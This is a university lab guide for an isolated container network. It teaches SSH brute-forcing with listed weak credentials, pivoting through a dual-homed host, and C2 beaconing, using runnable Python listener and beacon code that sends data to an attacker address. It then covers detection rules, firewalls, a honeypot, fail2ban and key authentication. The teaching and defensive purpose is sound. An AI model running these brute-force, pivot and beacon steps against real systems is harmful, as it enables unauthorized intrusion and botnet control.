# SSH Brute-Force & Botnet Lab — Step-by-Step Guide
**FEUP SSR — Cybersecurity Research Lab**  
*Educational use only — all traffic runs inside isolated Docker networks*

---

## Before you start — understanding what you have

Your lab has **6 containers** running on **2 isolated networks**:

```
attack_net (172.21.0.0/24)          internal_net (10.10.0.0/24)
─────────────────────────           ────────────────────────────
attacker   172.21.0.10              victim3    10.10.0.10
victim1    172.21.0.20  ←── also on internal_net as 10.10.0.20
victim2    172.21.0.21              honeypot   10.10.0.50
monitor    172.21.0.100             monitor    10.10.0.100
```

> **Why two networks?**
> This simulates a real enterprise — an external-facing network (attack_net)
> and an internal protected network (internal_net). The attacker cannot reach
> internal_net directly. They must first compromise victim1, then use it as a
> **pivot** to reach the internal network. This is lateral movement.

> **Why victim1 has two IPs?**
> victim1 is **dual-homed** — connected to both networks. This makes it the
> pivot point. Once compromised, it becomes the attacker's bridge into the
> internal network. In real enterprise breaches, dual-homed machines (like
> a web server that also has database access) are the most dangerous targets.

### Lab credentials (intentionally weak — for the attack phase)

| Container | Username | Password |
|---|---|---|
| victim1, victim2 | labuser | password123 |
| victim1, victim2 | admin | admin |
| victim1, victim2 | deploy | deploy123 |
| victim1, victim2 | root | toor |
| victim3, honeypot | labuser | internal123 |
| victim3, honeypot | svcaccount | service1 |
| victim3, honeypot | root | rootpass |

---

## Phase 0 — Start the lab

Always start here. Run this before any other step.

```bash
cd ~/Desktop/ssh-botnet-lab
podman compose up -d
```

Verify all 6 containers are running:

```bash
podman ps
```

You should see 6 containers all with status `Up`. If any show `Exited`:

```bash
podman rm -f attacker victim1 victim2 victim3 honeypot monitor
podman compose up -d --build
```

> **Note — Docker vs Podman:**
> Your Kali uses Podman, which is Docker-compatible but rootless.
> Rootless means containers run without root privileges on the host,
> which is more secure. The tradeoff: some kernel features like raw
> sockets are restricted, which is why we use the Python simulator
> scanner instead of nmap raw scans.

---

## Phase 1 — Reconnaissance (scanning)

**Goal:** Discover what machines are on the network and what ports are open.
In a real attack this is the first thing an attacker does.

Open a shell on the attacker container:

```bash
podman exec -it attacker bash
```

Run the port scanner and save results to a file:

```bash
python3 /lab/simulator.py scan --network 172.21.0. 2>&1 | \
  grep "OPEN" | awk '{print $5}' > /tmp/open_ports.txt
cat /tmp/open_ports.txt
```

Expected output:
```
172.21.0.20:22
172.21.0.21:22
```

Probe a specific port manually with netcat:

```bash
nc -zv 172.21.0.20 22
nc -zv 172.21.0.21 22
```

> **What is port scanning?**
> Before attacking, a hacker finds which machines exist and which services
> are running. Port 22 open = SSH server = potential brute-force target.
>
> **Why the scan is slow:**
> The scanner tries 11 ports × 29 hosts = 319 probes at 1s timeout.
> Most IPs return closed or no-route. Only the OPEN lines matter.
>
> **Why not use nmap directly?**
> Podman rootless blocks raw sockets (CAP_NET_RAW). Default nmap uses
> raw SYN packets which require this capability. The Python simulator
> uses normal TCP connect which works without special privileges.

---

## Phase 2 — SSH Brute-Force Attack

**Goal:** Gain access to victim1 and victim2 by trying username/password
combinations until one works.

### Prepare BOTH victims first — prevent connection throttling

```bash
podman exec victim1 bash -c "echo 'MaxStartups 50' >> /etc/ssh/sshd_config && kill -HUP 1"
podman exec victim2 bash -c "echo 'MaxStartups 50' >> /etc/ssh/sshd_config && kill -HUP 1"
```

> **Why this is needed:**
> sshd drops connections when too many are pending at once. The default
> is 10 — a rapid brute-force hits this immediately, causing connections
> to be dropped before the SSH banner is sent. This produces
> `SSHException: Error reading SSH protocol banner` in paramiko.
> If you run two attacks simultaneously (victim1 and victim2), both need
> this setting. Setting it to 50 gives enough room for the simulator.

### Run the attack — open 2 terminals simultaneously

**Terminal 1** — watch victim1's log:

```bash
podman exec -it victim1 tail -f /var/log/auth.log
```

**Terminal 2** — brute-force victim1:

```bash
podman exec -it attacker python3 /lab/simulator.py bruteforce \
  --target 172.21.0.20 --delay 1.0
```

To simulate a botnet attacking multiple machines at the same time,
open a **third terminal** and attack victim2 simultaneously:

```bash
podman exec -it attacker python3 /lab/simulator.py bruteforce \
  --target 172.21.0.21 --delay 1.0
```

> **Reading the log:**
> ```
> Failed password for admin from 172.21.0.10 port 39116 ssh2
> ```
> - `admin` — username tried
> - `172.21.0.10` — attacker IP, same on every line (primary detection signal)
> - `port 39116` — source port, different every attempt (new TCP per try)
>
> A brute-force has the same source IP appearing hundreds of times in
> seconds. That pattern is what the SSH-001 detection rule catches.

---

## Phase 3 — Manual SSH Login (verifying access)

After the brute-force finds credentials, verify you can log in:

```bash
podman exec -it attacker ssh -o StrictHostKeyChecking=no admin@172.21.0.20
# password: admin
```

Once inside victim1, look around:

```bash
whoami
hostname
ip addr show
ip route show
```

> **What `ip addr show` reveals:**
> You will see victim1 has TWO network interfaces:
> - eth0: 172.21.0.20 — attack_net (where you came from)
> - eth1: 10.10.0.20  — internal_net (the new network to explore)
>
> This is the pivot point. From here you can reach 10.10.0.x machines
> that are completely invisible from outside.

Exit back to the attacker:

```bash
exit
```

---

## Phase 4 — Lateral Movement (pivoting to Network B)

**Goal:** Use compromised victim1 as a bridge to attack machines in
internal_net that the attacker cannot reach directly.

> **Critical — the simulator MUST run FROM victim1, not the attacker.**
> The attacker only has access to attack_net. Running lateral from the
> attacker gives `[Errno 101] Network is unreachable` — which is correct.
> Only victim1 (dual-homed) can reach internal_net.

### Step 1 — Prepare victim1 to run the simulator

Victim containers have `internal: true` — no internet access. Copy
paramiko and shared libraries from the attacker container:

```bash
# Copy all Python packages from attacker to victim1
podman exec attacker bash -c "tar czf /tmp/pypkgs.tar.gz /usr/lib/python3/dist-packages/"
podman cp attacker:/tmp/pypkgs.tar.gz /tmp/pypkgs.tar.gz
podman cp /tmp/pypkgs.tar.gz victim1:/tmp/pypkgs.tar.gz
podman exec victim1 bash -c "cd / && tar xzf /tmp/pypkgs.tar.gz"

# Copy shared libraries paramiko depends on
podman exec attacker bash -c "tar czf /tmp/libs.tar.gz \
  /usr/lib/x86_64-linux-gnu/libsodium* \
  /usr/lib/x86_64-linux-gnu/libcrypto* \
  /usr/lib/x86_64-linux-gnu/libssl* 2>/dev/null"
podman cp attacker:/tmp/libs.tar.gz /tmp/libs.tar.gz
podman cp /tmp/libs.tar.gz victim1:/tmp/libs.tar.gz
podman exec victim1 bash -c "cd / && tar xzf /tmp/libs.tar.gz"
podman exec victim1 ldconfig

# Verify
podman exec victim1 python3 -c "import paramiko; print('paramiko ok')"

# Copy simulator and add internal network passwords to the wordlist
podman cp attacker:/lab/simulator.py /tmp/sim.py
podman cp /tmp/sim.py victim1:/tmp/sim.py
podman exec victim1 bash -c \
  "sed -i 's/\"pass1234\"/\"pass1234\", \"internal123\", \"service1\"/' /tmp/sim.py"
```

### Step 2 — Prepare victim3 (prevent throttling)

```bash
podman exec victim3 bash -c "echo 'MaxStartups 50' >> /etc/ssh/sshd_config && kill -HUP 1"
```

### Step 3 — Run the lateral brute-force FROM victim1

**Terminal 1** — watch victim3's log:

```bash
podman exec -it victim3 tail -f /var/log/auth.log
```

**Terminal 2** — run brute-force FROM victim1 (the pivot):

```bash
podman exec -it victim1 python3 /tmp/sim.py bruteforce \
  --target 10.10.0.10 --delay 1.0 --max-attempts 120
```

> **What the log shows on victim3:**
> ```
> Failed password for labuser from 10.10.0.20 port 41234 ssh2
> Accepted password for labuser from 10.10.0.20 port 41236 ssh2
> ```
> Source IP is `10.10.0.20` — victim1's internal address, NOT the real
> attacker `172.21.0.10`. The firewall protecting internal_net sees only
> a legitimate internal connection. This is what LATERAL-001 catches.

### Step 4 — Manual pivot (confirm full access chain)

```bash
# Step into victim1
podman exec -it victim1 bash

# From inside victim1, SSH directly to victim3
ssh -o StrictHostKeyChecking=no labuser@10.10.0.10
# password: internal123

# Confirm you are inside victim3
whoami      # labuser
hostname    # victim3
ip addr show

exit  # back to victim1
exit  # back to host
```

Full chain confirmed: **attacker → victim1 → victim3**

> **SSH port forwarding (advanced technique):**
> In a real attack, the attacker tunnels through victim1 without
> needing an interactive shell on it:
> ```bash
> ssh -L 2222:10.10.0.10:22 admin@172.21.0.20
> # Then in another terminal:
> ssh -p 2222 labuser@localhost
> ```
> You are now connected directly to victim3 through the tunnel.

---

## Phase 5 — C2 Beaconing (botnet communication)

**Goal:** Simulate infected machines checking in with the attacker's
command-and-control server.

> **Important network routing:**
> - victim1 can reach the attacker directly (`172.21.0.10`) — both on attack_net
> - victim3 is ONLY on internal_net — it CANNOT reach `172.21.0.10`
> - victim3 must beacon to victim1's internal IP (`10.10.0.20`) instead
>
> **Start the listener FIRST. If you run beacons before the listener
> is ready you get `[Errno 111] Connection refused`.**

### Step 1 — Start the C2 listener on the attacker

```bash
podman exec -it attacker python3 -c "
import socket, json
srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
srv.bind(('0.0.0.0', 8888))
srv.listen(10)
print('[C2] Listener ready on port 8888 — waiting for bots...')
while True:
    conn, addr = srv.accept()
    data = conn.recv(1024).decode(errors='ignore')
    print(f'[C2] BEACON from {addr[0]}: {data[:120]}')
    conn.send(b'HTTP/1.1 200 OK\r\n\r\nOK')
    conn.close()
"
```

Wait until you see `[C2] Listener ready` before continuing.

### Step 2 — Send beacons from victim1

```bash
podman exec -it victim1 python3 -c "
import socket, time, json
from datetime import datetime
for i in range(5):
    try:
        payload = json.dumps({
            'bot_id': 'victim1',
            'type': 'HEARTBEAT',
            'seq': i+1,
            'ts': datetime.utcnow().isoformat()
        }).encode()
        s = socket.create_connection(('172.21.0.10', 8888), timeout=3)
        s.send(b'POST /beacon HTTP/1.1\r\nContent-Length: '
               + str(len(payload)).encode() + b'\r\n\r\n' + payload)
        s.close()
        print(f'Beacon {i+1}/5 sent')
    except Exception as e:
        print(f'Beacon {i+1} failed: {e}')
    time.sleep(10)
"
```

### Step 3 — Add victim3 as a second bot

Note: victim3 beacons to `10.10.0.20` (victim1's internal IP),
NOT to `172.21.0.10` — victim3 has no route to attack_net.

First start a relay listener on victim1 in a separate terminal:

```bash
podman exec -it victim1 python3 -c "
import socket
srv = socket.socket()
srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
srv.bind(('0.0.0.0', 8888))
srv.listen(10)
print('[C2-relay] Listening on victim1:8888')
while True:
    conn, addr = srv.accept()
    data = conn.recv(1024).decode(errors='ignore')
    print(f'[C2-relay] BEACON from {addr[0]}: {data[:80]}')
    conn.send(b'HTTP/1.1 200 OK\r\n\r\n')
    conn.close()
"
```

Then beacon from victim3:

```bash
podman exec -it victim3 python3 -c "
import socket, time, json
from datetime import datetime
for i in range(5):
    try:
        payload = json.dumps({
            'bot_id': 'victim3',
            'type': 'HEARTBEAT',
            'seq': i+1,
            'ts': datetime.utcnow().isoformat()
        }).encode()
        s = socket.create_connection(('10.10.0.20', 8888), timeout=3)
        s.send(b'POST /beacon HTTP/1.1\r\nContent-Length: '
               + str(len(payload)).encode() + b'\r\n\r\n' + payload)
        s.close()
        print(f'Beacon {i+1}/5 sent from victim3')
    except Exception as e:
        print(f'Beacon {i+1} failed: {e}')
    time.sleep(10)
"
```

> **What good C2 detection looks like:**
> - Multiple internal machines making regular outbound HTTP connections
>   to the same IP on a non-standard port
> - Regular periodic timing with slight jitter (±seconds)
> - Small identical payload size on every connection
> - In production: HTTPS with TLS makes content inspection impossible,
>   so defenders rely on timing and destination analysis instead

---

## Phase 6 — Full Botnet Scenario

Run everything in sequence — the complete attack chain.

**Terminal 1 — watch victim1 logs:**
```bash
podman exec -it victim1 tail -f /var/log/auth.log
```

**Terminal 2 — start C2 listener:**
```bash
podman exec -it attacker python3 -c "
import socket
srv = socket.socket()
srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
srv.bind(('0.0.0.0', 8888)); srv.listen(10)
print('[C2] Ready on port 8888')
while True:
    c, a = srv.accept()
    print(f'[C2] BEACON from {a[0]}')
    c.recv(1024); c.send(b'HTTP/1.1 200 OK\r\n\r\n'); c.close()
"
```

**Terminal 3 — run full simulator scenario:**
```bash
podman exec -it attacker python3 /lab/simulator.py botnet
```

**Terminal 4 — run detection after it finishes:**
```bash
podman exec victim1 cat /var/log/auth.log > /tmp/combined_auth.log
podman exec victim3 cat /var/log/auth.log >> /tmp/combined_auth.log
podman cp /tmp/combined_auth.log monitor:/var/log/lab/auth.log
podman exec -it monitor python3 /lab/monitor/analyzer.py --report
```

---

## Phase 7 — Detection and Analysis

**Goal:** Identify the attack using logs and detection rules.

Copy logs into the monitor first, then run the analyzer:

```bash
# Collect logs from all victims
podman exec victim1 cat /var/log/auth.log > /tmp/combined_auth.log
podman exec victim2 cat /var/log/auth.log >> /tmp/combined_auth.log
podman exec victim3 cat /var/log/auth.log >> /tmp/combined_auth.log
podman cp /tmp/combined_auth.log monitor:/var/log/lab/auth.log

# Run detection
podman exec -it monitor python3 /lab/monitor/analyzer.py
podman exec -it monitor python3 /lab/monitor/analyzer.py --report
podman exec -it monitor python3 /lab/monitor/analyzer.py --rules
```

> **Detection rules explained:**
>
> **SSH-001 — Brute force:** ≥5 failed logins from the same source IP.
> Low false positives — legitimate users rarely fail more than 2–3 times.
>
> **SSH-002 — Password spray:** Same IP targeting many different usernames.
> Spray attacks stay under per-account lockout thresholds. Harder to detect.
>
> **SSH-003 — Successful brute-force:** Failed attempts followed by a
> successful login from the same IP. The smoking gun — attacker is inside.
>
> **LATERAL-001 — East-west SSH:** SSH where the source IP is also an
> internal address. Internal-to-internal SSH is almost always lateral
> movement from a compromised pivot.
>
> **HONEYPOT-001:** Any connection to `10.10.0.50`. Zero false positives —
> no legitimate user knows the honeypot exists.

---

## Phase 8 — Firewall Demo

**Goal:** See how iptables rules change the outcome of the attack.

Open a shell on victim1:

```bash
podman exec -it victim1 bash
```

**Step 1 — No firewall (default state):**

```bash
bash /lab/firewall_setup.sh weak
iptables -L INPUT -n -v
```

Run the brute-force from another terminal — it succeeds immediately.

**Step 2 — Rate limiting and logging:**

```bash
bash /lab/firewall_setup.sh moderate
```

Run the brute-force again. It still succeeds but every attempt is
logged as a firewall event. Detection without blocking.

Check the firewall log (run this inside victim1):

```bash
dmesg | grep "BRUTEFORCE-DETECT" | tail -10
```

**Step 3 — Full hardening:**

```bash
bash /lab/firewall_setup.sh hardened
iptables -L INPUT -n -v --line-numbers
```

Run the brute-force again — it fails completely.

> **DROP vs REJECT:**
> `-j DROP` silently discards — attacker times out with no feedback.
> `-j REJECT` discards and sends an error — faster for attacker but
> confirms the host exists. For SSH: DROP is better.
>
> **Default-deny policy:**
> `iptables -P INPUT DROP` — block everything unless explicitly allowed.
> This is the correct security posture.
>
> **Note on SIGHUP:**
> After running `firewall_setup.sh`, sshd receives SIGHUP and restarts.
> You will see `Received SIGHUP; restarting` in the auth.log — this is
> normal. sshd reloads its config and continues listening.

---

## Phase 9 — Honeypot Investigation

After running lateral movement, check if the honeypot was reached:

```bash
podman exec -it honeypot cat /var/log/auth.log
podman exec -it honeypot cat /var/log/lab/honeypot_events.jsonl
```

Deliberately trigger the honeypot from victim1:

```bash
podman exec -it victim1 python3 /tmp/sim.py bruteforce \
  --target 10.10.0.50 --delay 1.0 --max-attempts 120
```

> **Why honeypots have zero false positives:**
> No legitimate user knows `10.10.0.50` exists. Any connection is by
> definition an attacker. Compare to SSH-001 where an admin forgetting
> their password could trigger a false alert.
>
> **Honeypot placement matters:**
> In internal_net it only triggers if the attacker has already pivoted —
> confirming the full lateral movement chain with certainty.

---

## Phase 10 — Hardening (defense phase)

### 1. SSH key authentication

```bash
# Generate key pair on the attacker
podman exec -it attacker ssh-keygen -t ed25519 -f /root/.ssh/lab_key -N ""

# Copy public key to victim1
podman exec -it attacker ssh-copy-id -i /root/.ssh/lab_key.pub admin@172.21.0.20

# Test key login — no password prompt
podman exec -it attacker ssh -i /root/.ssh/lab_key admin@172.21.0.20
```

### 2. Disable password authentication

```bash
podman exec victim1 bash -c "
  sed -i 's/PasswordAuthentication yes/PasswordAuthentication no/' /etc/ssh/sshd_config
  kill -HUP 1
"
```

### 3. Verify brute-force no longer works

```bash
podman exec -it attacker python3 /lab/simulator.py bruteforce \
  --target 172.21.0.20 --delay 1.0
```

Every attempt fails — there is no password to guess.

> **Why key auth defeats brute-force:**
> SSH requires the client to prove ownership of a private key using
> a cryptographic challenge. The key never leaves the client machine.
> There is nothing to brute-force.

### 4. fail2ban — automatic IP banning

```bash
podman exec -it victim1 bash

apt-get update && apt-get install -y fail2ban

cat > /etc/fail2ban/jail.local << 'EOF'
[sshd]
enabled  = true
port     = 22
filter   = sshd
logpath  = /var/log/auth.log
maxretry = 5
bantime  = 3600
findtime = 600
EOF

service fail2ban start
fail2ban-client status sshd
```

Run the brute-force and watch fail2ban react:

```bash
# Terminal 2 — run attack
podman exec -it attacker python3 /lab/simulator.py bruteforce \
  --target 172.21.0.20 --delay 1.0

# Terminal 1 — watch the ban (inside victim1)
fail2ban-client status sshd
```

> **How fail2ban works:**
> Reads auth.log → counts failures per IP → when threshold exceeded,
> adds iptables DROP rule → removes ban after `bantime` seconds.
> This automates the full detect-and-respond loop.

---

## Quick reference

```bash
# Lab management
podman compose up -d                   # start all containers
podman compose down                    # stop all containers
podman ps                              # check container status
podman logs victim1                    # see container startup output

# Open shells
podman exec -it attacker bash
podman exec -it victim1 bash
podman exec -it victim3 bash
podman exec -it monitor bash

# Check logs
podman exec victim1 tail -f /var/log/auth.log
podman exec victim2 tail -f /var/log/auth.log
podman exec victim3 tail -f /var/log/auth.log
podman exec honeypot cat /var/log/auth.log
podman exec honeypot cat /var/log/lab/honeypot_events.jsonl

# Prepare victims before running attacks (run once per session)
podman exec victim1 bash -c "echo 'MaxStartups 50' >> /etc/ssh/sshd_config && kill -HUP 1"
podman exec victim2 bash -c "echo 'MaxStartups 50' >> /etc/ssh/sshd_config && kill -HUP 1"
podman exec victim3 bash -c "echo 'MaxStartups 50' >> /etc/ssh/sshd_config && kill -HUP 1"

# Attacker simulations
podman exec -it attacker python3 /lab/simulator.py scan --network 172.21.0.
podman exec -it attacker python3 /lab/simulator.py bruteforce --target 172.21.0.20 --delay 1.0
podman exec -it attacker python3 /lab/simulator.py bruteforce --target 172.21.0.21 --delay 1.0
podman exec -it attacker python3 /lab/simulator.py botnet

# Lateral movement (FROM victim1 — NOT from attacker)
podman exec -it victim1 python3 /tmp/sim.py bruteforce --target 10.10.0.10 --delay 1.0 --max-attempts 120
podman exec -it victim1 python3 /tmp/sim.py bruteforce --target 10.10.0.50 --delay 1.0 --max-attempts 120

# C2 — victim1 beacons to attacker (172.21.0.10)
# C2 — victim3 beacons to victim1 (10.10.0.20) — victim3 has no route to attacker

# Collect logs and run detection
podman exec victim1 cat /var/log/auth.log > /tmp/combined_auth.log
podman exec victim2 cat /var/log/auth.log >> /tmp/combined_auth.log
podman exec victim3 cat /var/log/auth.log >> /tmp/combined_auth.log
podman cp /tmp/combined_auth.log monitor:/var/log/lab/auth.log
podman exec -it monitor python3 /lab/monitor/analyzer.py
podman exec -it monitor python3 /lab/monitor/analyzer.py --report
podman exec -it monitor python3 /lab/monitor/analyzer.py --rules

# Firewall (inside victim1 bash session)
bash /lab/firewall_setup.sh weak
bash /lab/firewall_setup.sh moderate
bash /lab/firewall_setup.sh hardened
iptables -L INPUT -n -v
dmesg | grep "BRUTEFORCE-DETECT" | tail -10

# Network checks
podman exec victim1 ip addr show       # see dual-homed interfaces
podman exec victim1 ip route show      # routing table
podman exec victim1 ss -tlnp           # listening ports
```

---

## Clean up

```bash
# Stop containers (keeps images for next time)
podman compose down

# Full reset — removes everything
podman compose down --rmi all
podman network prune -f
```

---

## Lessons learned from setup — Podman rootless issues

| Issue | Cause | Fix applied |
|---|---|---|
| `chroot /run/sshd: Operation not permitted` | Podman rootless lacks CAP_SYS_CHROOT | Removed `cap_drop: ALL` from victim containers |
| `rsyslog: unrecognized service` | No systemd in rootless containers | Replaced with `sshd -e` for direct file logging |
| `UsePrivilegeSeparation` deprecated | Removed in OpenSSH 8.9 (Ubuntu 22.04) | Removed from sshd_config |
| `SSHException: Error reading SSH protocol banner` | sshd MaxStartups throttling | Added `MaxStartups 50` to all victim sshd configs |
| `apt-get` fails in victims | `internal: true` blocks internet | Copied packages via `podman cp` from attacker |
| victim3 cannot reach attacker C2 | victim3 only on internal_net | victim3 beacons to victim1 (10.10.0.20) instead |
| Analyzer reads 0 events | Log format mismatch — sshd -e has no syslog prefix | Collect logs manually with `podman exec victim cat` |
| subnet conflict on startup | Old lab network still allocated | Changed subnet to 172.21.0.0/24 |

---

## Lab limitations for the report

| Limitation | Real world equivalent |
|---|---|
| Podman rootless blocks raw sockets | Use a VM for nmap SYN scans |
| Paramiko must be copied manually | Pre-installed in production images |
| MaxStartups must be raised manually | Real hardened servers keep this low |
| Plaintext C2 on port 8888 | Real C2 uses HTTPS or DNS tunneling |
| victim3 cannot directly reach attacker C2 | Real botnets route through the network |
| Small wordlist (17 passwords) | Real attacks use rockyou.txt (14M entries) |
| No real persistence mechanisms | Real bots install cron jobs, systemd units |
| Single host for all containers | Real lab uses separate physical machines |
| No MFA simulation | MFA is the most effective brute-force defense |

---

*Lab built for FEUP SSR — May 2026*
*All traffic contained within isolated Podman bridge networks*
*No connection to the internet or host system*
